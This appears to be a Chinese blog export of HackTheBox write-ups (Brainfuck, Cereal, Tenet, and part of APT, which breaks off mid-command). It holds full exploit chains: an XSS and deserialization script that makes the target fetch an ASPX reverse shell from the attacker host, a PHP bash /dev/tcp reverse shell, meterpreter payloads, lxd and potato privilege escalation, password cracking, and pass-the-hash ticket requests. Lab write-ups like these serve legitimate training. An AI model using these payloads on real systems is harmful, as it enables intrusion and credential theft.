smtp里可以看到smtp配置信息。密码隐藏的直接调一下就可以看到： 1orestis ： kHGuERB29DNiNE ticket.html123456&lt;form method=\"post\" action=\"https://brainfuck.htb/wp-admin/admin-ajax.php\"&gt; Username: &lt;input type=\"text\" name=\"username\" value=\"admin\"&gt; &lt;input type=\"hidden\" name=\"email\" value=\"sth\"&gt; &lt;input type=\"hidden\" name=\"action\" value=\"loginGuestFacebook\"&gt; &lt;input type=\"submit\" value=\"Login\"&gt;&lt;/form&gt; SMTPenum直接使用得到的用户名密码从SMTP获取信息。得到两封邮件内容,其中包括secret forum的用户名密码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263$ ncat 10.10.10.17 110+OK Dovecot ready.USER orestis+OKPASS kHGuERB29DNiNE+OK Logged in.LIST+OK 2 messages:1 9772 514.RETR 1+OK 977 octetsReturn-Path: &lt;www-data@brainfuck.htb&gt;X-Original-To: orestis@brainfuck.htbDelivered-To: orestis@brainfuck.htbReceived: by brainfuck (Postfix, from userid 33) id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)To: orestis@brainfuck.htbSubject: New WordPress SiteX-PHP-Originating-Script: 33:class-phpmailer.phpDate: Mon, 17 Apr 2017 17:15:40 +0000From: WordPress &lt;wordpress@brainfuck.htb&gt;Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)MIME-Version: 1.0Content-Type: text/plain; charset=UTF-8Your new WordPress site has been successfully set up at:https://brainfuck.htbYou can log in to the administrator account with the following information:Username: adminPassword: The password you chose during the install.Log in here: https://brainfuck.htb/wp-login.phpWe hope you enjoy your new site. Thanks!--The WordPress Teamhttps://wordpress.org/.RETR 2+OK 514 octetsReturn-Path: &lt;root@brainfuck.htb&gt;X-Original-To: orestisDelivered-To: orestis@brainfuck.htbReceived: by brainfuck (Postfix, from userid 0) id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)To: orestis@brainfuck.htbSubject: Forum Access DetailsMessage-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)From: root@brainfuck.htb (root)Hi there, your credentials for our \"secret\" forum are below :)username: orestispassword: kIEnnfEKJ#9UmdORegards. sup3rs3cr3t.brainfuck.htb 回到前面的论坛，使用得到的账号密码登录： ssh access里orestis说他的账号锁了，让管理员把key给他，key里是加密通讯： vigenere注意orestis的签名信息，两篇帖子对应关系,以及url格式： 123456Orestis - Hacking for fun and profitQbqquzs - Pnhekxs dpi fca fhf zdmgztmnvze:&#x2F;&#x2F;10.10.10.17&#x2F;8zb5ra10m915218697q1h658wfoq0zc8&#x2F;frmfycu&#x2F;sp_ptr 可能是一个URLmnvze:&#x2F;&#x2F; -&gt; https:&#x2F;&#x2F;sp_ptr -&gt; id_rsa 加密方式是vigenere http://rumkin.com/tools/cipher/vigenere.php 密钥是fuckmybrain： 解出来ssh key下载地址： 1https:&#x2F;&#x2F;10.10.10.17&#x2F;8ba5aa10e915218697d1c658cdee0bb8&#x2F;orestis&#x2F;id_rsa ssh key下载下来并不能直接使用，还需要密码,直接john破解出来密码： 123456wget https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificatechmod 600 id_rsapython /usr/share/john/ssh2john.py id_rsa &gt; hash.txtsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt3poulakia! user flag然后直接ssh登录，用户目录得到user.txt: 提权信息提权有不同的方式，预期是密码学，也可以lxd非预期打 lxd当前用户在lxd组中，利用方式： 12orestis@brainfuck:~$ iduid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare) Lxd Privilege Escalationhttps://www.hackingarticles.in/lxd-privilege-escalation/ Ubuntu 18.04 - ‘lxd’ Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/46978 RSA当前用户目录还有几个文件，简单看一下可以知道是RSA： debug.txtencrypt.sage12345678910111213141516171819202122nbits &#x3D; 1024password &#x3D; open(&quot;&#x2F;root&#x2F;root.txt&quot;).read().strip()enc_pass &#x3D; open(&quot;output.txt&quot;,&quot;w&quot;)debug &#x3D; open(&quot;debug.txt&quot;,&quot;w&quot;)m &#x3D; Integer(int(password.encode(&#39;hex&#39;),16))p &#x3D; random_prime(2^floor(nbits&#x2F;2)-1, lbound&#x3D;2^floor(nbits&#x2F;2-1), proof&#x3D;False)q &#x3D; random_prime(2^floor(nbits&#x2F;2)-1, lbound&#x3D;2^floor(nbits&#x2F;2-1), proof&#x3D;False)n &#x3D; p*qphi &#x3D; (p-1)*(q-1)e &#x3D; ZZ.random_element(phi)while gcd(e, phi) !&#x3D; 1: e &#x3D; ZZ.random_element(phi)c &#x3D; pow(m, e, n)enc_pass.write(&#39;Encrypted Password: &#39;+str(c)+&#39;\\n&#39;)debug.write(str(p)+&#39;\\n&#39;)debug.write(str(q)+&#39;\\n&#39;)debug.write(str(e)+&#39;\\n&#39;) output.txt1Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 RSA Decrypt get root flag基础RSA，debug里给出了p,q,e: RSA given q, p and e? - Cryptography Stack Exchangehttps://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e/19530#19530 解出来pt decode hex就是root.txt: solve.py1234567891011121314151617181920212223242526272829303132333435def egcd(a, b): x,y, u,v = 0,1, 1,0 while a != 0: q, r = b//a, b%a m, n = x-u*q, y-v*q b,a, x,y, u,v = a,r, u,v, m,n gcd = b return gcd, x, ydef main(): p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307 q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079 e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997 ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182 # compute n n = p * q # Compute phi(n) phi = (p - 1) * (q - 1) # Compute modular inverse of e gcd, a, b = egcd(e, phi) d = a print( \"n: \" + str(d) ); # Decrypt ciphertext pt = pow(ct, d, n) print( \"pt: \" + str(pt) ) print( \"root.txt: \" + format(pt,'x').decode('hex') ) if __name__ == \"__main__\": main() lxd to root这个跟之前做过的Tabby一样： Tabby - HackTheBox | 喵喵喵喵 | 某鱼唇的人类https://darkwing.moe/2020/07/14/Tabby-HackTheBox/#%E6%8F%90%E6%9D%83 1234567891011121314151617# 本地buildgit clone https://github.com/saghul/lxd-alpine-builder.gitcd lxd-alpine-buildersudo bash build-alpine# 靶机操作wget 10.10.14.4:7777/alpine-v3.12-x86_64-20200710_2021.tar.gzlxc image import ./alpine-v3.12-x86_64-20200710_2021.tar.gz --alias miaolxc image list# 这一步如果No storage pool found的话，先# lxd init 一路默认即可lxc init miao miaoaaaa -c security.privileged=truelxc config device add miaoaaaa mydevice disk source=/ path=/mnt/root recursive=truelxc start miaoaaaalxc exec miaoaaaa /bin/shcd /mnt/root/root 参考资料 WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation - PHP webapps Exploithttps://www.exploit-db.com/exploits/41006 http://rumkin.com/tools/cipher/vigenere.php Lxd Privilege Escalationhttps://www.hackingarticles.in/lxd-privilege-escalation/ Ubuntu 18.04 - ‘lxd’ Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/46978 RSA given q, p and e? - Cryptography Stack Exchangehttps://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e/19530#19530 Tabby - HackTheBox | 喵喵喵喵 | 某鱼唇的人类https://darkwing.moe/2020/07/14/Tabby-HackTheBox/#%E6%8F%90%E6%9D%83 Hack The Box - Brainfuck | Nikhil’s Cybersec Bloghttps://0xw0lf.github.io/hackthebox/oscp-like/2020/07/06/HTB-BrainFuck/ https://www.hackthebox.eu/home/machines/writeup/17 HackTheBox - Brainfuck - YouTubehttps://www.youtube.com/watch?v=o5x1yg3JnYI&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Cereal - HackTheBox","slug":"Cereal-HackTheBox","date":"2021-01-19T01:44:13.000Z","updated":"2021-05-31T00:50:45.711Z","comments":true,"path":"2021/01/19/Cereal-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/01/19/Cereal-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/299 10.10.10.217 端口扫描22，80，443: 12345678910111213141516171819202122232425262728$ nmap -sC -sV 10.10.10.217Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 16:24 CSTNmap scan report for 10.10.10.217Host is up (0.076s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey:| 2048 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac (RSA)| 256 fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac (ECDSA)|_ 256 cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e (ED25519)80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Did not follow redirect to https://10.10.10.217/443/tcp open ssl/http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Cereal| ssl-cert: Subject: commonName=cereal.htb| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb| Not valid before: 2020-11-11T19:57:18|_Not valid after: 2040-11-11T20:07:19|_ssl-date: 2021-01-18T08:25:57+00:00; 0s from scanner time.| tls-alpn:|_ http/1.1Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 78.75 seconds 80/443直接ip访问会跳到443 https,需要登录： source.cereal.htb前面扫描结果中有子域名，加hosts访问： git leak很容易发现git泄漏，那就dump下来分析代码： http://source.cereal.htb/.git/config https://github.com/WangYihang/GitHacker JWT key查看git log发现有security fix，回滚到之前的版本： 1git reset --hard 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5 在Services/UserService.cs中发现硬编码的jwt key： 1var key = Encoding.ASCII.GetBytes(\"secretlhfIH&amp;FY*#oysuflkhskjfhefesf\"); 反序列化另外在Controllers\\RequestsController.cs中发现反序列化： XSSClientApp\\src\\AdminPage\\AdminPage.jsx中有XSS： Cross-site Scripting (XSS) in react-marked-markdown | Snykhttps://snyk.io/vuln/npm:react-marked-markdown:20180517 利用链大概就是通过XSS去触发反序列化 exploit生成jwt https://github.com/ticarpi/jwt_tool 123python3 jwt_tool.py -b -S hs256 -p &#39;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#39; $(echo -n &#39;&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#39; | base64).$(echo -n &#39;&#123;&quot;name&quot;: &quot;1&quot;, &quot;exp&quot;:&#39; &#96;date -d &quot;+7 days&quot; +%s&#96;&#125; | base64 -w0).eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImV4cCI6MTYxMTI1MjY2NH0.FgxODspIu3yNTBepPeOCqxA8eAFPIFPox0AmAhzSLgU csharp序列化 https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx 1234567891011121314Cereal.DownloadHelper dh &#x3D; new Cereal.DownloadHelper&#123; URL &#x3D; &quot;https:&#x2F;&#x2F;someurl&#x2F;pic.png&quot;, FilePath &#x3D; &quot;pic.png&quot;,&#125;;string json &#x3D; JsonConvert.SerializeObject(dh, new JsonSerializerSettings&#123; TypeNameHandling &#x3D; TypeNameHandling.All&#125;);Console.WriteLine(json);# output&#123;&quot;$type&quot;:&quot;Cereal.DownloadHelper, Cereal&quot;,&quot;URL&quot;:&quot;http:&#x2F;&#x2F;10.10.14.11:7777&#x2F;shell.aspx&quot;,&quot;FilePath&quot;:&quot;c:&#x2F;inetpub&#x2F;source&#x2F;uploads&#x2F;shell.aspx&quot;&#125; exp.py1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsfrom urllib3.exceptions import InsecureRequestWarningimport base64requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)jwt_token = '&lt;token&gt;'my_ip = '&lt;ip&gt;'URL = 'https://cereal.htb/requests'js_payload = \"\"\"var jwt_token = '\"\"\"+jwt_token+ \"\"\"';targeturl = 'https://cereal.htb/requests';req = new XMLHttpRequest;var payload = JSON.stringify(&#123;\"json\": '&#123;\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\":\"http://\"\"\" +my_ip+\"\"\"/shell.aspx\",\"FilePath\":\"C:/inetpub/source/uploads/shell.aspx\"&#125;'&#125;);req.onreadystatechange = function() &#123; if (req.readyState == 4) &#123; var id = JSON.parse(this.responseText).id; //console.log(id) req2 = new XMLHttpRequest; req2.open('GET', targeturl + \"/\" + id, false); req2.setRequestHeader(\"Authorization\", \"Bearer \" + jwt_token); req2.send(); &#125;&#125;req.open('POST', targeturl, false);req.setRequestHeader(\"Authorization\", \"Bearer \" + jwt_token);req.setRequestHeader('Content-type', 'application/json');req.send(payload);\"\"\"js_payload_b64 = base64.b64encode(js_payload.encode('utf-8'))payload = &#123;'json': '&#123;\"title\":\"[XSS](javascript: eval(atob(%22' + js_payload_b64.decode('utf-8') + '%22%29%29)\", \"flavor\":\"x\", \"color\":\"#FFF\", \"description\":\"x\"&#125;'&#125;headers = &#123;'Authorization': 'Bearer ' + jwt_token&#125;print(\"shending payload: \" + str(payload))r = requests.post(URL, headers=headers, json=payload, verify=False)print(r.text) exploit123456python -m SimpleHTTPServer 7777python3 exp.pyrlwrap nc -lvvp 4445# 等收到http请求后再去访问触发shellcurl -k https://source.cereal.htb/uploads/shell.aspx user flag打到的sonny用户桌面得到user.txt: 信息搜集netstat端口发现有个8080端口： 123456789101112131415161718192021222324252627282930313233netstat -aon | findstr /i \"listening\" TCP 0.0.0.0:22 0.0.0.0:0 LISTENING 1664 TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 892 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:8172 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 496 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 508 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 1096 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 636 TCP 0.0.0.0:49675 0.0.0.0:0 LISTENING 648 TCP 10.10.10.217:139 0.0.0.0:0 LISTENING 4 TCP 127.0.0.1:49668 0.0.0.0:0 LISTENING 3416 TCP 127.0.0.1:49671 0.0.0.0:0 LISTENING 3704 TCP [::]:22 [::]:0 LISTENING 1664 TCP [::]:80 [::]:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 892 TCP [::]:443 [::]:0 LISTENING 4 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:5985 [::]:0 LISTENING 4 TCP [::]:8080 [::]:0 LISTENING 4 TCP [::]:8172 [::]:0 LISTENING 4 TCP [::]:47001 [::]:0 LISTENING 4 TCP [::]:49664 [::]:0 LISTENING 496 TCP [::]:49665 [::]:0 LISTENING 508 TCP [::]:49666 [::]:0 LISTENING 1096 TCP [::]:49667 [::]:0 LISTENING 636 TCP [::]:49675 [::]:0 LISTENING 648 TCP [::1]:49668 [::]:0 LISTENING 3416 whoamiwhoami发现有SeImpersonatePrivilege权限： 12345678PRIVILEGES INFORMATION----------------------Privilege Name Description State&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;SeChangeNotifyPrivilege Bypass traverse checking EnabledSeImpersonatePrivilege Impersonate a client after authentication EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Disabled meterpreter方便操作可以加载个meterpreter： 123456789101112131415# localmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=4446 -b \"\\x00\\x0a\" -a x64 --platform windows -f exe -o miao.exemsfconsole -quse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset LHOST 10.10.14.18set LPORT 4446run# targetmkdir C:\\tempcd C:\\tempcurl http://10.10.14.18:7777/miao.exe -o C:\\temp\\miao.exe.\\miao.exe portfwd把8080端口转发出来： 1portfwd add -l 8081 -p 8080 -r 127.0.0.1 然后访问本地8081就相当于访问靶机8080: Graphql可以看到是graphal： 经过枚举发现可调用updatePlant函数，可以用来做SSRF exploitssrf + SeImpersonatePrivilege &gt; juicy potato with http: https://github.com/micahvandeusen/GenericPotato 123456789curl http:&#x2F;&#x2F;10.10.14.18:7777&#x2F;nc64.exe -o C:\\temp\\nc64.execurl http:&#x2F;&#x2F;10.10.14.18:7777&#x2F;GenericPotato.exe -o C:\\temp\\GenericPotato.execurl http:&#x2F;&#x2F;10.10.14.18:7777&#x2F;NtApiDotNet.xml -o C:\\temp\\NtApiDotNet.xml.\\GenericPotato.exe -p &quot;C:\\temp\\nc64.exe&quot; -a &quot;10.10.14.18 4447 -e powershell&quot; -e HTTP -l 8889.\\GenericPotato.exe -p &quot;C:\\temp\\nc64.exe&quot; -a &quot;&lt;my_ip&gt; 9005 -e powershell&quot; -e HTTP -l 8889rlwrap nc -lvvp 4447curl -k -X &quot;POST&quot; -H &quot;Content-Type: application&#x2F;json&quot; --data-binary &#39;&#123;&quot;query&quot;:&quot;mutation&#123;updatePlant(plantId:2, version:2.2, sourceURL:\\&quot;http:&#x2F;&#x2F;localhost:8889\\&quot;)&#125;&quot;&#125;&#39; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;api&#x2F;graphql&#39; root flag然后Administrator用户桌面得到root.txt: 参考资料 https://github.com/WangYihang/GitHacker https://github.com/ticarpi/jwt_tool https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx https://github.com/micahvandeusen/GenericPotato HackTheBox Cereal Writeup | RaidForumshttps://raidforums.com/Thread-Tutorial-HackTheBox-Cereal-Writeup","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Tenet - HackTheBox","slug":"Tenet-HackTheBox","date":"2021-01-18T04:11:39.000Z","updated":"2021-06-15T07:27:49.164Z","comments":true,"path":"2021/01/18/Tenet-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/01/18/Tenet-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/309 10.10.10.223 端口扫描常规22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.10.223Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 10:48 CSTNmap scan report for 10.10.10.223Host is up (0.074s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)| 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)|_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.02 seconds 80直接ip访问是apache默认页面，把tenet.htb加hosts： 是一个wordpress，在一个评论里提示sator php backup，这是子域名，同样加hosts： 110.10.10.223 tenet.htb sator.tenet.htb ##sator.tenet.htb 直接访问是apache默认页面，根据前面的提示信息，很容易得到bak文件备份： php 反序列化查看sator代码，很明显是php反序列化： Exploiting PHP deserialization. Intro to PHP object injection… | by Vickie Li | The Startup | Mediumhttps://medium.com/swlh/exploiting-php-deserialization-56d71f03282a https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf exploit那就是直接利用反序列化写php文件，触发reverse shell： 123php exp.phppython3 -c 'import pty;pty.spawn(\"/bin/bash\")' exp.php123456789101112131415161718&lt;?phpclass DatabaseExport&#123; public $user_file = 'test.php'; public $data = '&lt;?php exec(\"/bin/bash -c \\'bash -i &gt; /dev/tcp/10.10.14.11/4445 0&gt;&amp;1\\'\"); ?&gt;'; public function __destruct() &#123; file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data); echo '[] Database updated'; &#125;&#125;$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));$response = file_get_contents(\"$url\");$response = file_get_contents(\"http://10.10.10.223/test.php\");?&gt; 信息搜集然后就在wordpress/wp-config.php里得到mysql用户名密码： 12345&#x2F;** MySQL database username *&#x2F;define( &#39;DB_USER&#39;, &#39;neil&#39; );&#x2F;** MySQL database password *&#x2F;define( &#39;DB_PASSWORD&#39;, &#39;Opera2112&#39; ); 这也就直接是ssh用户名密码 user flag直接ssh登录，读取user.txt: 提权信息sudo -l可以看到当前用户可以sudo运行/usr/local/bin/enableSSH.sh： 查看这个文件，里面addkey就是把/tmp/ssh-XXXXXXXX复制写入到/root/.ssh/authorized_keys，那么可以考虑做条件竞争，把我们自己的公钥写到/tmp/ssh-XXXXXXXX，从而使其复制写入到/root/.ssh/authorized_keys： 条件竞争 &amp;&amp; root flag就是两个脚本，一个写入公钥到tmp，一个sudo调用enableSSH.sh，竞争成功即可root登录，得到root.txt： add_rsa.sh1234while truedoecho \"ssh-rsa key\" | tee /tmp/ssh-*done 1.sh1234while truedosudo /usr/local/bin/enableSSH.shdone 参考资料 Exploiting PHP deserialization. Intro to PHP object injection… | by Vickie Li | The Startup | Mediumhttps://medium.com/swlh/exploiting-php-deserialization-56d71f03282a https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf Tenet Writeup FREE | RaidForumshttps://raidforums.com/Thread-Free-Flag-Tenet-Writeup-FREE","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"APT - HackTheBox","slug":"APT-HackTheBox","date":"2021-01-15T00:51:28.000Z","updated":"2021-04-14T04:37:12.515Z","comments":true,"path":"2021/01/15/APT-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/01/15/APT-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/296 10.10.10.213 端口扫描常规扫描只有80和135: 12345678910111213141516$ nmap -sC -sV 10.10.10.213Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 14:22 CSTNmap scan report for 10.10.10.213Host is up (0.069s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Gigantic Hosting | Home135/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 120.01 seconds ipv6 adder这个靶机是很少见的，需要ipv6扫描，首先用脚本获得ipv6地址： https://github.com/mubix/IOXIDResolver 123456$ python IOXIDResolver.py -t 10.10.10.213[*] Retrieving network interface of 10.10.10.213Address: aptAddress: 10.10.10.213Address: dead:beef::b885:d62a:d679:573fAddress: dead:beef::1886:4043:2062:4876 # 忽略这个 加hosts： 1dead:beef::b885:d62a:d679:573f apt.htb ipv6 scanIpv6看到很多端口可能开放，例如445: 12345678910111213141516171819202122232425sudo nmap -vv --reason -6 -Pn -sU -A --top-ports=20 --version-all dead:beef::b885:d62a:d679:573f...PORT STATE SERVICE REASON VERSION53/udp open|filtered domain no-response67/udp open|filtered dhcps no-response68/udp open|filtered dhcpc no-response69/udp open|filtered tftp no-response123/udp open|filtered ntp no-response135/udp open|filtered msrpc no-response137/udp open|filtered netbios-ns no-response138/udp open|filtered netbios-dgm no-response139/udp open|filtered netbios-ssn no-response161/udp open|filtered snmp no-response162/udp open|filtered snmptrap no-response445/udp open|filtered microsoft-ds no-response500/udp open|filtered isakmp no-response514/udp open|filtered syslog no-response520/udp open|filtered route no-response631/udp open|filtered ipp no-response1434/udp open|filtered ms-sql-m no-response1900/udp open|filtered upnp no-response4500/udp open|filtered nat-t-ike no-response49152/udp open|filtered unknown no-response... SMB这里需要vpn和smbclient同一台机器才能访问到ipv6地址，mac连vpn，kali虚拟机能访问到靶机ipv4,访问不了ipv6: 1smbclient -L //apt.htb/ -U\"\" smb匿名访问，可以看到有个backup目录： backup1smbclient //apt.htb/backup -U\"\" 里面是一个zip文件，下载下来： 解压需要密码： backupzip crack那就首先破解压缩包密码： 123fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zipPASSWORD FOUND!!!!: pw == iloveyousomuch 解压获得文件： secrets看到里面有SYSTEM和ntds.dit，那就是通过这两个文件提取hash： 123cp Active\\ Directory/ntds.dit .cp registry/SYSTEM .impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL &gt; user_pass_and_hash.txt 手动把txt开头结尾的输出删掉，只留hash信息 users.txt提取出用户名： 1cat users_and_hashes.txt | awk -F '\\\\:' '&#123;print $1&#125;' | uniq -u | sort &gt; users.txt kerbrute可以看到2001个用户名，太多了，下一步可以用kerbrute筛选出有效的用户名： https://github.com/ropnop/kerbrute 这里先改下hosts, 域控和域也加进去： 1dead:beef::b885:d62a:d679:573f apt.htb apt.htb.local htb.local 之后kerbrute做用户枚举： 1./kerbrute_linux_amd64 userenum --dc apt.htb.local -d htb.local users.txt 只有三个有效用户名，只需要关注henry.vinson(爆破挺费时间的，等吧)： henry.vinsonhash也只需要这个用户的就可以，但这个hash并不能直接用于登录： 123456cat users_and_hashes.txt | grep henry.vinson henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f:::henry.vinson:aes256-cts-hmac-sha1-96:4c0ec4cffc953266ed72d9b565da62115655d2f402416af92e4e76d121663e2fhenry.vinson:aes128-cts-hmac-sha1-96:da63c28166768a2829f00d30ec9fbdddhenry.vinson:des-cbc-md5:80a2c83213b3dfd6 hashes之前得到的那些也可以处理一下，只留hash： 1cat users_and_hashes.txt | grep -v aes | grep -v des | awk -F '\\\\:' '&#123;print $3\":\"$4&#125;' &gt; hashes.txt impacketgetTGT如果尝试crackmapexec用有效用户名和hash组合爆破的话会被锁定，可以使用getTGT,得到有效hash及tgt(hash不能通过evil-winrm登录): 123impacket-getTGT HTB.local&#x2F;henry.vinson@apt.htb -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffbexport KRB5CCNAME&#x3D;henry.vinson@apt.htb.ccache gettgt.sh1234while IFS='' read -r LINE || [ -n \"$&#123;LINE&#125;\" ]; do echo \"processing line: $&#123;LINE&#125;\" impacket-getTGT HTB.local/henry.vinson@apt.htb -hashes $&#123;LINE&#125;done &lt; hashes.txt regdump因为我们有ticket。可以去dump注册表(这一步也费时间，等吧)： 1impacket-reg -k apt.htb.local query -keyName HKU -s &gt;&gt; regdump.txt henry password搜索发现Username，去查看对应位置得到password： 12UserName REG_SZ henry.vinson_admPassWord REG_SZ G1#Ny5@2dvht user flag然后直接evil-winrm连上去，得到user.txt: 信息搜集powershell历史中相关信息，显示更改过LAN Manager的安全级别，根据文档，2意味着客户端设备使用NTLMv1身份验证，如果服务器支持，则它们使用NTLMv2会话安全性。域控制器接受LM，NTLM和NTLMv2身份验证： 1234type C:\\Users\\henry.vinson_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt$Cred &#x3D; get-credential administratorinvoke-command -credential $Cred -computername localhost -scriptblock 